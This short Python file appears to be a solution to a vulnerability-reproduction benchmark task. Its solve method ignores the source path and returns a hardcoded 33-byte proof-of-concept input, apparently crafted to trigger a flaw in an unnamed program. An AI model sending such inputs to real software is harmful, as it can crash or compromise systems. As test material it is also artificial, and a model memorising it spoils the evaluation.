class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x12\x00\x00\x00\x21\x00\x04\x00\x00\x00\x00\x00' + b'\x00' * 21
        return poc
